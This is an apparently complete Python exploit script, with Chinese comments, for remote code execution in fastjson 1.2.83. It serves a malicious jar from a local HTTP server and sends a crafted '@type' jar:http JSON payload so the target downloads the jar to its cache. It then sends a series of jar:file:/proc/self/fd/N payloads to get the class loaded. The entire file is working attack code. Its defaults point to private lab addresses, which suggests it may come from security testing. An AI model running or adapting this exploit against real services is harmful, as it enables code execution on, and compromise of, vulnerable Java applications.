#!/usr/bin/env python3
"""fastjson 1.2.83 RCE · jar:http 落盘 + jar:file:/proc/self/fd/N 爆破

流程:
  1. 将恶意 jar（artifacts/1283/probe_file）复制一份改名为 x
  2. 本地 HTTP 提供 x（目标通过 jar:http://<IP>:<PORT>/x 下载到 jar_cache，fd 保持打开）
  3. 从 payload 文件（artifacts/1283/fd-payload.txt）读取 fd1~fd100 爆破 payload，逐行发送

用法:
  python exp_1283.py --url http://192.168.50.2:4125/parse/1283
"""
import argparse
import http.server
import os
import shutil
import sys
import threading
import traceback

import requests

# Windows 控制台默认 GBK，强制 UTF-8
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DEFAULT_JAR = os.path.join(BASE_DIR, "poc", "artifacts", "1283", "probe_file")
DEFAULT_PAYLOAD = os.path.join(BASE_DIR, "poc", "artifacts", "1283", "fd-payload.txt")


def parse_args():
    ap = argparse.ArgumentParser(description="fastjson 1.2.83 fd 爆破 exploit")
    ap.add_argument("--jar", default=DEFAULT_JAR, help="恶意 jar 路径（默认 artifacts/1283/probe_file）")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD, help="payload 文件（每行一个 JSON）")
    ap.add_argument("--url", default="http://192.168.50.2:4125/parse/1283", help="目标解析端点")
    ap.add_argument("--host", default="0.0.0.0", help="HTTP 服务绑定地址")
    ap.add_argument("--ip", default="192.168.50.1", help="攻击机 IP（目标可达，stage jar:http 下载用，转整数）")
    ap.add_argument("--port", type=int, default=11111, help="HTTP 服务端口（须与 payload 中 jar:http 端口一致）")
    ap.add_argument("--jar-name", default="x", help="HTTP 提供的 jar 文件名（默认 x）")
    ap.add_argument("--timeout", type=float, default=10, help="单请求超时（秒）")
    return ap.parse_args()


def main():
    args = parse_args()

    jar_abs = os.path.abspath(args.jar)
    if not os.path.exists(jar_abs):
        sys.exit(f"[!] jar not found: {jar_abs}（请先运行 GenFileProbe 生成）")
    workdir = os.path.dirname(jar_abs)
    jar_copy = os.path.join(workdir, args.jar_name)
    shutil.copyfile(jar_abs, jar_copy)
    print(f"[+] jar {jar_abs} -> {jar_copy} ({os.path.getsize(jar_copy)} bytes)")

    old_cwd = os.getcwd()
    os.chdir(workdir)
    httpd = http.server.HTTPServer((args.host, args.port), http.server.SimpleHTTPRequestHandler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    os.chdir(old_cwd)
    print(f"[*] serving {args.jar_name} on {args.host}:{args.port} (dir: {workdir})")

    with open(args.payload, "r", encoding="utf-8") as f:
        payloads = [line.strip() for line in f if line.strip()]
    if not payloads:
        sys.exit(f"[!] payload file empty: {args.payload}")
    print(f"[*] {len(payloads)} payload(s) loaded from {args.payload}")

    # 阶段1: 让目标先通过 jar:http 把 x 下载进 jar_cache（fd 保持打开）
    def ip_int(ip):
        a, b, c, d = map(int, ip.split("."))
        return (a << 24) | (b << 16) | (c << 8) | d

    stage = ('{"@type":"jar:http:..' + str(ip_int(args.ip)) + ':' + str(args.port)
             + '.' + args.jar_name + '!.E1","x":1}')
    try:
        rsp = requests.post(args.url, data=stage.encode("utf-8"),
                            headers={"Content-Type": "application/json"},
                            timeout=args.timeout, proxies={})
        print(f"[stage] SSRF download jar -> HTTP {rsp.status_code}")
    except Exception as e:
        print(f"[stage] ERR: {type(e).__name__}: {e}")

    hit = False
    for i, payload in enumerate(payloads, 1):
        try:
            rsp = requests.post(
                args.url,
                data=payload.encode("utf-8"),
                headers={"Content-Type": "application/json"},
                timeout=args.timeout,
                proxies={},
            )
            text = rsp.text.replace("\n", " ")[:120]
            print(f"[{i}/{len(payloads)}] HTTP {rsp.status_code}: {text}")
            if rsp.status_code == 200:
                hit = True
        except Exception as e:
            traceback.print_exc()
            print(f"[{i}/{len(payloads)}] ERR: {type(e).__name__}: {e}")

    httpd.shutdown()
    print("[*] done" + ("  (200 received, class likely loaded)" if hit else ""))


if __name__ == "__main__":
    main()
